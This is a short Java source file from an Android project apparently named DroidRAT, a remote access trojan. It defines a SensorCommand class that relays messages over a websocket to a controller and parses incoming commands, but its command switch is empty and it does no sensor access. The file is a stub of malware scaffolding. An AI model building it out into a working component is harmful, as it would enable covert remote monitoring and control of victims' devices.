package com.je_chen.droidrat_je.rat.command;

import android.hardware.SensorManager;

import com.je_chen.droidrat_je.rat.command.process_super.CommandFather;

import static com.je_chen.droidrat_je.service.command.ProcessCommandService.websockets;

public class SensorCommand extends CommandFather {

    public SensorCommand(SensorManager sensorManager) {
    }

    @Override
    public void send(String value) {
        websockets.send(value);
    }

    @Override
    public void processCommand(String command) {
        try {
            String[] rawCommandArray = command.split(" ");
            switch (rawCommandArray[1]) {

            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
